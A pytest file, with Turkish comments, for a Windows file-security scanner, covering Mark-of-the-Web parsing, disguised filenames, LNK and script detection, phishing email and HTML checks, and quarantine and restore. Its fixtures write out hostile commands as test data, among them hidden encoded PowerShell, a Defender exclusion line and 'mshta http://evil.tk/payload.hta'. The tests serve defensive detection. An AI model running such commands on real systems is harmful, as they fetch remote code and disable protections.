"""v1.3.0: Çevrimdışı Windows dosya, script, .eml, MotW ve karantina testleri."""

from email.message import EmailMessage

import pytest

from app.cli import main as cli_main
from app.services.file_scanner import (
    inspect_lnk_bytes,
    parse_eml_bytes,
    parse_motw_text,
    quarantine_file,
    restore_quarantined_file,
    scan_file_security,
    scan_path,
)


def test_parse_motw_text():
    raw = "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://evil.tk/login\r\nHostUrl=https://evil.tk/fatura.exe\r\n"
    m = parse_motw_text(raw)
    assert m["zone_id"] == 3
    assert "evil.tk" in m["host_url"]
    assert "evil.tk" in m["referrer_url"]


def test_double_extension_and_rlo(tmp_path):
    f1 = tmp_path / "fatura.pdf.exe"
    f1.write_bytes(b"test")
    r1 = scan_file_security(f1)
    assert r1["risk_score"] >= 25

    f2 = tmp_path / "belge\u202efdp.exe"
    f2.write_bytes(b"test")
    r2 = scan_file_security(f2)
    assert r2["risk_score"] >= 35
    assert any("RLO" in x for x in r2["reasons"])


def test_pe_magic_mismatch_inside_pdf(tmp_path):
    f = tmp_path / "dekont.pdf"
    f.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00fake-pe-header")
    r = scan_file_security(f, motw_override={"zone_id": 3, "host_url": "http://evil.tk/dekont.pdf", "referrer_url": ""})
    assert r["risk_score"] >= 55
    assert r["risk_level"] in ("HIGH", "CRITICAL")
    assert any("MZ" in x for x in r["reasons"])


def test_lolbin_scripts_and_lnk(tmp_path):
    ps1 = tmp_path / "update.ps1"
    ps1.write_text("powershell -w hidden -enc JAB4AD0AMQA=\nAdd-MpPreference -ExclusionPath C:\\", encoding="utf-8")
    r_ps = scan_file_security(ps1)
    assert r_ps["risk_score"] >= 50
    assert r_ps["risk_level"] in ("HIGH", "CRITICAL")

    bat = tmp_path / "run.bat"
    bat.write_text("@echo off\nmshta http://evil.tk/payload.hta\n", encoding="utf-8")
    r_bat = scan_file_security(bat)
    assert r_bat["risk_score"] >= 50

    lnk = tmp_path / "belge.lnk"
    lnk_bytes = b"\x4c\x00\x00\x00" + "powershell -enc AAAA http://evil.tk/x".encode("utf-16-le")
    assert any("powershell" in s.lower() for s in inspect_lnk_bytes(lnk_bytes))
    lnk.write_bytes(lnk_bytes)
    r_lnk = scan_file_security(lnk)
    assert r_lnk["risk_score"] >= 50


def test_eml_parsing_and_scan(tmp_path):
    msg = EmailMessage()
    msg["Subject"] = "Hesabiniz kapanacak!"
    msg["From"] = "Destek <destek@gmail.com>"
    msg["Reply-To"] = "evil@evil.tk"
    msg["Authentication-Results"] = "mx; spf=fail dkim=fail"
    msg.set_content("Hemen tikla http://evil.tk/verify sifrenizi gonderin")
    msg.add_attachment(b"MZ", maintype="application", subtype="octet-stream", filename="fatura.pdf.exe")

    raw = msg.as_bytes()
    parsed = parse_eml_bytes(raw)
    assert parsed["subject"] == "Hesabiniz kapanacak!"
    assert parsed["attachments"][0]["filename"] == "fatura.pdf.exe"

    eml = tmp_path / "phish.eml"
    eml.write_bytes(raw)
    r = scan_file_security(eml)
    assert r["risk_score"] >= 75
    assert r["risk_level"] == "CRITICAL"
    assert r["phishing_detected"] is True


def test_html_password_form(tmp_path):
    html = tmp_path / "login.html"
    html.write_text("<form action='http://evil.tk/post'><input type='password' name='pw'></form>", encoding="utf-8")
    r = scan_file_security(html)
    assert r["risk_score"] >= 25
    assert r["phishing_detected"] is True


def test_benign_file_low_no_fp(tmp_path):
    f = tmp_path / "notlar.txt"
    f.write_text("Yarin saat 10:00'da proje toplantisi var.", encoding="utf-8")
    r = scan_file_security(f)
    assert r["risk_level"] == "LOW"
    assert r["risk_score"] == 0


def test_quarantine_and_restore(tmp_path):
    src = tmp_path / "inbox" / "bad.ps1"
    src.parent.mkdir(parents=True, exist_ok=True)
    src.write_text("powershell -w hidden -enc JAB4", encoding="utf-8")

    qdir = tmp_path / "vault"
    rep = scan_file_security(src)
    rec = quarantine_file(src, quarantine_dir=qdir, report=rep)
    assert not src.exists()
    qpath = tmp_path / "vault" / rec["quarantine_path"].split("\\")[-1].split("/")[-1]
    assert qpath.exists()
    assert qpath.suffix == ".quarantined"
    assert (qdir / "file_quarantine.jsonl").exists()

    restored = restore_quarantined_file(qpath, tmp_path / "restored" / "bad.ps1")
    assert restored.exists()
    assert not qpath.exists()


def test_scan_path_and_cli_exit_codes(tmp_path):
    good = tmp_path / "clean.txt"
    good.write_text("selam dunya", encoding="utf-8")
    bad = tmp_path / "evil.ps1"
    bad.write_text("powershell -w hidden -enc JAB4", encoding="utf-8")

    reports = scan_path(tmp_path)
    assert len(reports) == 2
    assert reports[0]["filename"] == "evil.ps1"

    assert cli_main(["scan-path", str(good), "--quiet", "--fail-on", "HIGH"]) == 0
    assert cli_main(["scan-path", str(bad), "--quiet", "--fail-on", "HIGH"]) == 1
    assert cli_main(["scan-path", str(tmp_path / "yok.txt")]) == 2

    with pytest.raises(FileNotFoundError):
        scan_file_security(tmp_path / "olmayan.bin")


def test_shortener_url_no_tcom_false_positive_and_exact_restore_allowlist(tmp_path, monkeypatch):
    import json
    import urllib.request
    from pathlib import Path

    from app import settings_store
    from app.desktop_ui import DesktopPanelServer
    from app.services.ai_analyzer import _check_url
    from app.services.file_scanner import lookup_quarantine_record

    monkeypatch.setenv("ELFSEC_CONFIG_DIR", str(tmp_path / "cfg"))
    monkeypatch.setenv("APPDATA", str(tmp_path / "cfg"))
    monkeypatch.setenv("PROGRAMDATA", str(tmp_path / "pd"))
    settings_store.set_explicit(None)

    # "...t.com" uzantili normal alan adlari "t.co" kisalticisi sanilmamali!
    assert _check_url("https://downloads.cloudflareclient.com/v1/download/windows/version/2026.8") == (0, None)
    assert _check_url("http://ocsp.digicert.com") == (0, None)
    assert _check_url("http://www.digicert.com\x00") == (0, None)
    assert _check_url("https://t.co/xyz")[0] == 15
    assert _check_url("https://bit.ly/xyz")[0] == 15

    # İndirilen normal arşiv (.zip / .rar) yüksek risk alarmı üretmemeli
    zip_dl = tmp_path / "capture.zip"
    zip_dl.write_bytes(b"PK\x03\x04clean-capture")
    rep_zip = scan_file_security(
        zip_dl,
        motw_override={
            "zone_id": 3,
            "host_url": "https://atolye.sibervatan.org/api/contents/assets/file-1.zip",
            "referrer_url": "https://atolye.sibervatan.org/",
        },
    )
    assert rep_zip["risk_level"] == "LOW"
    assert rep_zip["risk_score"] < 25

    # Orijinal konuma geri yukleme + SHA-256 izin listesi testi
    orig_dir = tmp_path / "orig_downloads"
    orig_dir.mkdir()
    orig_file = orig_dir / "tool.ps1"
    orig_file.write_text("powershell -w hidden -enc JAB4", encoding="utf-8")

    qdir = tmp_path / "cfg" / "quarantine"
    rep = scan_file_security(orig_file)
    rec = quarantine_file(orig_file, quarantine_dir=qdir, report=rep)
    qpath = Path(rec["quarantine_path"])
    assert not orig_file.exists() and qpath.exists()
    found = lookup_quarantine_record(qpath)
    assert found and found["original_path"] == str(orig_file)

    srv = DesktopPanelServer()
    srv.start()
    try:
        req = urllib.request.Request(
            f"http://127.0.0.1:{srv.port}/api/quarantine/action",
            data=json.dumps({"action": "restore", "path": str(qpath)}).encode("utf-8"),
            method="POST",
            headers={"X-ElfSec-Token": srv.token, "Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            res = json.loads(resp.read().decode("utf-8"))
        assert res["ok"] is True
        assert res["restored_to"] == str(orig_file)
        assert orig_file.exists() and not qpath.exists()
        # Tekrar taraninca SHA-256 izin listesinde oldugu icin 0 LOW donmeli
        re_scan = scan_file_security(orig_file)
        assert re_scan["risk_score"] == 0 and re_scan["risk_level"] == "LOW"
    finally:
        srv.stop()
        settings_store.set_explicit(None)
